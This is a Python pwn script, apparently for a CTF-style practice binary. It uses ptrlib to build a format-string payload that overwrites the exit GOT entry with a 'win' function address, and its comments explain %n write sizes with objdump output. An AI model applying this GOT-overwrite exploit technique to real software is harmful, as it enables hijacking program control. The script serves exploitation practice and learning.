from ptrlib import *

libc_bin = '/usr/lib/libc.so.6'
bin_file = './easy'

libc = ELF(libc_bin)
elf = ELF(bin_file)
proc = Process(bin_file)

# find lbic_bin
# ldd easy
# 	linux-vdso.so.1 (0x00007e0ddc1f8000)
# 	libc.so.6 => /usr/lib/libc.so.6 (0x00007e0ddbfe9000)
# 	/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007e0ddc1fa000)

# find got for plt
# objdump easy -s -j .got.plt
# Contents of section .got.plt:
#  403fe8 f83d4000 00000000 00000000 00000000  .=@.............
#  403ff8 00000000 00000000 36104000 00000000  ........6.@.....
#  404008 46104000 00000000 56104000 00000000  F.@.....V.@.....
#  404018 66104000 00000000 76104000 00000000  f.@.....v.@.....
#  404028 86104000 00000000                    ..@.....

# find plt
# objdump -d -M intel easy --disassemble=exit@plt
# 0000000000401070 <exit@plt>:
#   401070:	ff 25 aa 2f 00 00    	jmp    QWORD PTR [rip+0x2faa]        # 404020 <exit@GLIBC_2.2.5>
#   401076:	68 04 00 00 00       	push   0x4
#   40107b:	e9 a0 ff ff ff       	jmp    401020 <_init+0x20>

# bits meant to be archtecture 64 or 32
# (the address bits)

# bs is for bit size for write in 
# bs=4 (%n)
# bs=2 (%hn) this
# bs=1 (%hhn)

# size is for total byts to write in 
# size=1 (8 bytes to write in)
# size=2 (16 bytes to write in)
# size=3 (24 bytes to write in)
# size=4 (32 bytes to write in)
# size=4 (64 bytes to write in)

# byte    bit   digit   example
# 1       8     2       0x41
# 2       16    4       0xBEEF
# 4       32	8       0xDEADBEEF
# 8       64	16      0xDEADBEEFCAFEBABE

# to calculate size, sub plt and win 
# exit_got_address:  0x404028
# exit_plt_address:  0x401080
# over write bytes:  0x2fa8
# it means size 2 (2bytes)
    # exit_plt_address = elf.plt("exit")
    # print("exit_got_address: ", hex(exit_got_address))
    # print("exit_plt_address: ", hex(exit_plt_address))
    # print("over write bytes: ", hex(exit_got_address - exit_plt_address))

# if the size is small, you should use bs=1
# example, bs=1, size=1
    # print("payload length: ", hex(len(payload)))

def attack():
    exit_got_address = elf.got("exit")
    win_address = elf.symbol("win")
    writes = {
            exit_got_address: win_address
    }
    payload = fsb(
            6, writes, bs=2, bits=64, size=2
    )
    proc.sendafter("Input message\n", payload)
    proc.interactive()
    return

if __name__ == '__main__':
    attack()
